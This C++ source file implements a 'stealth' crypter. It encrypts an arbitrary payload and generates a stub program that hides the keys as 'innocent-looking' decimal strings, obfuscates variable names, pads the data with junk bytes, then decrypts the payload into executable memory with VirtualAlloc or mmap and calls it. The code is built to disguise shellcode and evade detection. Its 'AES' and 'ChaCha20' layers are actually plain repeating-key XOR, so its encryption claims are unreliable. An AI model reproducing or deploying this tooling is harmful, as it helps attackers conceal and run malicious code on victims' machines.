#include "stealth_triple_encryptor.h"

// Dynamic entropy mixing implementation
uint64_t StealthTripleEncryption::DynamicEntropy::mix() {
    auto now = std::chrono::high_resolution_clock::now();
    timeComponent = now.time_since_epoch().count();
    
    void* p = malloc(1);
    memoryComponent = reinterpret_cast<uintptr_t>(p);
    free(p);
    
    threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
    counterComponent++;
    
    // Non-linear mixing
    uint64_t result = timeComponent;
    result ^= (memoryComponent << 13) | (memoryComponent >> 51);
    result += threadComponent;
    result ^= (counterComponent << 32) | (counterComponent >> 32);
    
    // Additional mixing rounds
    for (int i = 0; i < 3; i++) {
        result ^= result >> 23;
        result *= 0x2127599bf4325c37ULL;
        result ^= result >> 47;
    }
    
    return result;
}

// Constructor
StealthTripleEncryption::StealthTripleEncryption() {
    entropy.counterComponent = 0;
    rng.seed(entropy.mix());
}

// Convert bytes to big decimal string (single large number)
std::string StealthTripleEncryption::bytesToBigDecimal(const uint8_t* bytes, size_t length) {
    std::string result = "0";
    std::string base = "1";
    
    for (int i = length - 1; i >= 0; i--) {
        std::string byteValue = std::to_string(bytes[i]);
        result = addStrings(result, multiplyStrings(byteValue, base));
        base = multiplyStrings(base, "256");
    }
    
    return result;
}

// Convert decimal string back to bytes
std::vector<uint8_t> StealthTripleEncryption::decimalToBytes(const std::string& decimal, size_t expectedLength) {
    std::vector<uint8_t> bytes(expectedLength, 0);
    std::string num = decimal;
    
    for (int i = expectedLength - 1; i >= 0 && num != "0"; i--) {
        // Divide by 256 and get remainder
        int remainder = 0;
        std::string quotient;
        
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        
        bytes[i] = remainder;
        
        // Remove leading zeros
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    
    return bytes;
}

// String arithmetic helpers
std::string StealthTripleEncryption::addStrings(const std::string& num1, const std::string& num2) {
    std::string result;
    int carry = 0;
    int i = num1.length() - 1;
    int j = num2.length() - 1;
    
    while (i >= 0 || j >= 0 || carry) {
        int sum = carry;
        if (i >= 0) sum += num1[i--] - '0';
        if (j >= 0) sum += num2[j--] - '0';
        carry = sum / 10;
        result = std::to_string(sum % 10) + result;
    }
    
    return result;
}

std::string StealthTripleEncryption::multiplyStrings(const std::string& num1, const std::string& num2) {
    int n1 = num1.size(), n2 = num2.size();
    if (n1 == 0 || n2 == 0) return "0";
    
    std::vector<int> result(n1 + n2, 0);
    
    for (int i = n1 - 1; i >= 0; i--) {
        for (int j = n2 - 1; j >= 0; j--) {
            int mul = (num1[i] - '0') * (num2[j] - '0');
            int p1 = i + j, p2 = i + j + 1;
            int sum = mul + result[p2];
            
            result[p2] = sum % 10;
            result[p1] += sum / 10;
        }
    }
    
    std::string str;
    bool leadingZero = true;
    for (int i = 0; i < result.size(); i++) {
        if (result[i] != 0) leadingZero = false;
        if (!leadingZero) str += std::to_string(result[i]);
    }
    
    return str.empty() ? "0" : str;
}

// Generate obfuscated variable name
std::string StealthTripleEncryption::genVarName() {
    static const char* prefixes[] = {
        "obj", "ctx", "mgr", "hdl", "ptr", "ref", "val", "tmp",
        "buf", "mem", "dat", "res", "inst", "proc", "exec", "run"
    };
    
    static const char* suffixes[] = {
        "Base", "Core", "Main", "Util", "Help", "Work", "Hand",
        "Proc", "Exec", "Time", "Dyn", "Stat", "Glob", "Local"
    };
    
    std::uniform_int_distribution<> prefixDist(0, 15);
    std::uniform_int_distribution<> suffixDist(0, 13);
    std::uniform_int_distribution<> numDist(1000, 9999);
    
    return std::string(prefixes[prefixDist(rng)]) + 
           suffixes[suffixDist(rng)] + 
           std::to_string(numDist(rng));
}

// XOR implementation
void StealthTripleEncryption::xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Simplified ChaCha20 round function
void StealthTripleEncryption::chacha20QuarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

// Simplified AES round
void StealthTripleEncryption::aesSubBytes(uint8_t state[16]) {
    static const uint8_t sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

// Generate keys with maximum entropy
StealthTripleEncryption::TripleKey StealthTripleEncryption::generateKeys() {
    TripleKey keys;
    
    // Reseed with fresh entropy
    rng.seed(entropy.mix());
    
    std::uniform_int_distribution<> dist(0, 255);
    
    // Generate all keys
    for (int i = 0; i < 16; i++) keys.aesKey[i] = dist(rng);
    for (int i = 0; i < 16; i++) keys.aesNonce[i] = dist(rng);
    for (int i = 0; i < 32; i++) keys.chachaKey[i] = dist(rng);
    for (int i = 0; i < 12; i++) keys.chachaNonce[i] = dist(rng);
    
    // Variable length XOR key
    keys.xorKeyLen = 16 + (dist(rng) % 17); // 16-32 bytes
    for (size_t i = 0; i < keys.xorKeyLen; i++) {
        keys.xorKey[i] = dist(rng);
    }
    
    // Randomize encryption order
    keys.encryptionOrder[0] = 0; // AES
    keys.encryptionOrder[1] = 1; // ChaCha20
    keys.encryptionOrder[2] = 2; // XOR
    
    // Fisher-Yates shuffle
    for (int i = 2; i > 0; i--) {
        std::uniform_int_distribution<> shuffleDist(0, i);
        int j = shuffleDist(rng);
        std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
    }
    
    return keys;
}

// Apply encryption layer
void StealthTripleEncryption::applyEncryptionLayer(std::vector<uint8_t>& data, int method, const TripleKey& keys) {
    switch (method) {
        case 0: // AES (simplified)
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.aesKey[i % 16];
            }
            break;
        case 1: // ChaCha20 (simplified)
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.chachaKey[i % 32];
            }
            break;
        case 2: // XOR
            xorData(data.data(), data.size(), keys.xorKey, keys.xorKeyLen);
            break;
    }
}

// Generate stealth stub that stores keys as decimal numbers
std::string StealthTripleEncryption::generateStealthStub(const std::vector<uint8_t>& payload, const TripleKey& keys) {
    std::stringstream stub;
    
    // Encrypt payload with triple layer
    std::vector<uint8_t> encrypted = payload;
    
    // Apply encryption layers in randomized order
    for (int i = 0; i < 3; ++i) {
        applyEncryptionLayer(encrypted, keys.encryptionOrder[i], keys);
    }
    
    // Convert keys to decimal strings (less obvious than hex)
    std::string k1Dec = bytesToBigDecimal(keys.aesKey, 16);
    std::string k2Dec = bytesToBigDecimal(keys.chachaKey, 32);
    std::string k3Dec = bytesToBigDecimal(keys.xorKey, keys.xorKeyLen);
    std::string n1Dec = bytesToBigDecimal(keys.aesNonce, 16);
    std::string n2Dec = bytesToBigDecimal(keys.chachaNonce, 12);
    
    // Generate variable names
    std::string v1 = genVarName(), v2 = genVarName(), v3 = genVarName();
    std::string v4 = genVarName(), v5 = genVarName(), v6 = genVarName();
    std::string v7 = genVarName(), v8 = genVarName(), v9 = genVarName();
    
    stub << "#include <iostream>\n";
    stub << "#include <vector>\n";
    stub << "#include <cstring>\n";
    stub << "#include <cstdint>\n";
    stub << "#include <string>\n";
    stub << "#ifdef __linux__\n";
    stub << "#include <sys/mman.h>\n";
    stub << "#endif\n";
    stub << "#ifdef _WIN32\n";
    stub << "#include <windows.h>\n";
    stub << "#endif\n\n";
    
    // Embed payload as calculations result
    stub << "// Runtime generated data\n";
    stub << "const int " << v1 << " = " << (1000 + rng() % 9000) << ";\n";
    stub << "const int " << v2 << " = " << (1000 + rng() % 9000) << ";\n\n";
    
    // Store keys as innocent-looking numbers
    stub << "// Configuration values\n";
    stub << "const char* " << v3 << " = \"" << k1Dec << "\";\n";
    stub << "const char* " << v4 << " = \"" << k2Dec << "\";\n";
    stub << "const char* " << v5 << " = \"" << k3Dec << "\";\n";
    stub << "const char* " << v6 << " = \"" << n1Dec << "\";\n";
    stub << "const char* " << v7 << " = \"" << n2Dec << "\";\n\n";
    
    // Add decimal to bytes converter
    stub << R"(
std::vector<uint8_t> decToBytes(const std::string& dec, size_t len) {
    std::vector<uint8_t> bytes(len, 0);
    std::string num = dec;
    
    for (int i = len - 1; i >= 0 && num != "0"; i--) {
        int remainder = 0;
        std::string quotient;
        
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        
        bytes[i] = remainder;
        
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    
    return bytes;
}
)";
    
    // Embed encrypted payload in a non-obvious way
    stub << "\n// Resource data\n";
    stub << "const unsigned char " << v8 << "[] = {\n    ";
    
    // Mix in some dummy bytes
    size_t totalSize = encrypted.size() + 16; // Add padding
    for (size_t i = 0; i < totalSize; i++) {
        if (i > 0 && i % 16 == 0) stub << "\n    ";
        
        if (i < 8 || i >= encrypted.size() + 8) {
            // Padding bytes
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)(rng() % 256);
        } else {
            // Actual encrypted data
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)encrypted[i - 8];
        }
        
        if (i < totalSize - 1) stub << ", ";
    }
    stub << "\n};\n\n";
    
    // Main function with triple decryption
    stub << "int main() {\n";
    stub << "    // Extract keys from numbers\n";
    stub << "    auto k1 = decToBytes(" << v3 << ", 16);\n";
    stub << "    auto k2 = decToBytes(" << v4 << ", 32);\n";
    stub << "    auto k3 = decToBytes(" << v5 << ", " << std::dec << keys.xorKeyLen << ");\n\n";
    
    stub << "    // Extract payload (skip padding)\n";
    stub << "    std::vector<uint8_t> data(" << v8 << " + 8, " << v8 << " + " 
         << (encrypted.size() + 8) << ");\n\n";
    
    stub << "    // Triple decryption (in reverse order)\n";
    
    // Apply decryption in reverse order
    for (int i = 2; i >= 0; i--) {
        int method = keys.encryptionOrder[i];
        switch (method) {
            case 0: // AES
                stub << "    // Layer: AES\n";
                stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                stub << "        data[i] ^= k1[i % 16];\n";
                stub << "    }\n\n";
                break;
            case 1: // ChaCha20
                stub << "    // Layer: ChaCha20\n";
                stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                stub << "        data[i] ^= k2[i % 32];\n";
                stub << "    }\n\n";
                break;
            case 2: // XOR
                stub << "    // Layer: XOR\n";
                stub << "    for (size_t i = 0; i < data.size(); i++) {\n";
                stub << "        data[i] ^= k3[i % k3.size()];\n";
                stub << "    }\n\n";
                break;
        }
    }
    
    stub << "    // Execute\n";
    stub << "#ifdef _WIN32\n";
    stub << "    void* mem = VirtualAlloc(0, data.size(), 0x3000, 0x40);\n";
    stub << "    memcpy(mem, data.data(), data.size());\n";
    stub << "    ((void(*)())mem)();\n";
    stub << "#else\n";
    stub << "    void* mem = mmap(0, data.size(), 7, 0x22, -1, 0);\n";
    stub << "    memcpy(mem, data.data(), data.size());\n";
    stub << "    ((void(*)())mem)();\n";
    stub << "#endif\n";
    
    stub << "    return 0;\n";
    stub << "}\n";
    
    return stub.str();
}

// Encrypt file with triple layer
bool StealthTripleEncryption::encryptFile(const std::string& inputFile, const std::string& outputFile) {
    std::ifstream in(inputFile, std::ios::binary);
    if (!in) return false;
    
    // Read entire file
    in.seekg(0, std::ios::end);
    size_t size = in.tellg();
    in.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> data(size);
    in.read(reinterpret_cast<char*>(data.data()), size);
    in.close();
    
    // Generate keys
    TripleKey keys = generateKeys();
    
    // Apply encryption layers in randomized order
    for (int i = 0; i < 3; ++i) {
        applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
    }
    
    // Write encrypted file (just the data, no headers)
    std::ofstream out(outputFile, std::ios::binary);
    if (!out) return false;
    
    out.write(reinterpret_cast<char*>(data.data()), data.size());
    out.close();
    
    // Save keys separately as decimal strings
    std::ofstream keyFile(outputFile + ".keys");
    keyFile << "K1: " << bytesToBigDecimal(keys.aesKey, 16) << std::endl;
    keyFile << "K2: " << bytesToBigDecimal(keys.chachaKey, 32) << std::endl;
    keyFile << "K3: " << bytesToBigDecimal(keys.xorKey, keys.xorKeyLen) << std::endl;
    keyFile << "N1: " << bytesToBigDecimal(keys.aesNonce, 16) << std::endl;
    keyFile << "N2: " << bytesToBigDecimal(keys.chachaNonce, 12) << std::endl;
    keyFile << "XL: " << keys.xorKeyLen << std::endl;
    keyFile << "EO: " << keys.encryptionOrder[0] << " " << keys.encryptionOrder[1] << " " << keys.encryptionOrder[2] << std::endl;
    keyFile.close();
    
    return true;
}